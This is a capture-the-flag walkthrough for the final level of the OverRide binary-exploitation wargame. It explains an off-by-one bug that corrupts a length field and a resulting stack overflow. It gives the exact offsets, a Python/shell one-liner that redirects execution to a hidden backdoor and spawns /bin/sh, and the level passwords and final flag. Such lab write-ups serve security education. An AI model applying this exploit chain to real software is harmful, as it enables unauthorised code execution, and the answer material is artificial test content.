# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level09@localhost:~/level09 .
# Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the functions. You'll find:

- `main()` - Simple wrapper that calls `handle_msg()`
- `handle_msg()` - Sets up a structure on the stack
- `set_username()` - Reads username input
- `set_msg()` - Reads message input
- `secret_backdoor()` - **Hidden function that's never called!**

## 3. Understand the structure layout

In `handle_msg()`, a structure is allocated on the stack with this layout:

```
Offset 0:   message[140 bytes]
Offset 140: username[40 bytes]
Offset 180: len (4 bytes, initialized to 140)
```

The structure starts at `RBP - 0xc0` (192 bytes below saved RBP).

## 4. Identify the off-by-one vulnerability in set_username

```c
for (i = 0; i < 41 && input[i] != '\0'; i++) {
    data->username[i] = input[i];
}
```

**The bug:**
- Loop condition allows up to **41 iterations** (i = 0 to 40)
- Username buffer is only **40 bytes**
- The 41st byte (index 40) **overwrites the first byte of `len`**

**Exploitation:**
- Send 40 characters + `\xff` (byte value 255)
- This changes `len` from 140 (0x8c) to 255 (0xff)

## 5. Identify the buffer overflow in set_msg

```c
strncpy(data->message, input, (size_t)data->len);
```

**The bug:**
- Uses the **corrupted `len` value** from step 4
- Normal: copies 140 bytes into 140-byte buffer (safe)
- Corrupted: copies 255 bytes into 140-byte buffer (overflow!)

**What we can overwrite:**
- Message buffer (140 bytes)
- Username buffer (40 bytes, already filled)
- len variable (4 bytes, already corrupted)
- Saved RBP (8 bytes)
- **Saved RIP (8 bytes) ← Our target!**

## 6. Calculate the offset to saved RIP

**Memory layout:**
```
RBP - 0xc0: Start of message buffer
RBP - 0x00: Saved RBP
RBP + 0x08: Saved RIP (return address)
```

**Calculation:**
- From start of message to saved RBP: 0xc0 = 192 bytes
- Saved RBP size: 8 bytes
- **Total offset to saved RIP: 192 + 8 = 200 bytes**

## 7. Discover the secret_backdoor function

The binary contains a hidden function that's never called:

```c
void secret_backdoor(void) {
    char command_buffer[128];
    fgets(command_buffer, 128, stdin);
    system(command_buffer);
}
```

**What it does:**
1. Reads a command from stdin (up to 128 bytes)
2. Executes it via `system()`
3. Gives us arbitrary command execution!

## 8. Find the address of secret_backdoor

Since PIE (Position Independent Executable) may be enabled, we need to find the runtime address:

```bash
ssh level09@localhost -p 2222
# Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

gdb ./level09
```

**In GDB:**
```gdb
(gdb) break main
Breakpoint 1 at 0xaac
(gdb) run
Starting program: /home/users/level09/level09

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

**Important:** The address `0x55555555488c` is what we'll use in our exploit.

## 9. Build the exploit payload

We need to send **three inputs** to the program:

**Input 1 (Username):** Corrupt the `len` variable
```python
"A" * 40 + "\xff"
```
- 40 'A' characters fill the username buffer
- `\xff` (255) overwrites the first byte of `len`

**Input 2 (Message):** Overflow to RIP and redirect execution
```python
"B" * 200 + struct.pack("<Q", 0x55555555488c)
```
- 200 'B' characters pad to reach saved RIP
- `struct.pack("<Q", 0x55555555488c)` writes the address in little-endian format
- This overwrites saved RIP with address of `secret_backdoor`

**Input 3 (Command for backdoor):** Command to execute
```python
"/bin/sh"
```
- After returning to `secret_backdoor`, it reads this via `fgets`
- Executes it via `system("/bin/sh")`
- Gives us a shell!

**Why `struct.pack("<Q", addr)`?**
- `"<"` = little-endian byte order (x86-64 standard)
- `"Q"` = unsigned long long (8 bytes for 64-bit address)
- Without this, Python would treat the address as a string, not binary data
- Example: `0x55555555488c` becomes `\x8c\x48\x55\x55\x55\x55\x00\x00`

## 10. Execute the exploit

**Complete exploit:**
```bash
(python -c 'import struct; print "A"*40 + "\xff"; print "B"*200 + struct.pack("<Q", 0x55555555488c); print "/bin/sh"'; cat) | ./level09
```

**Why `cat` at the end?**
- Keeps stdin open after the Python script finishes
- Allows us to interact with the shell we spawned
- Without it, the shell would immediately close

**Expected output:**
```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!
```

**At this point, the program appears to hang, but you have a shell!**

Type commands:
```bash
whoami
```

**Output:**
```
end
```

**Read the final flag:**
```bash
cat /home/users/end/.pass
```

**Output:**
```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

## 11. Flag

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

**Congratulations!** You've completed the final level of OverRide by chaining an off-by-one error with a buffer overflow to gain arbitrary code execution! 🎉
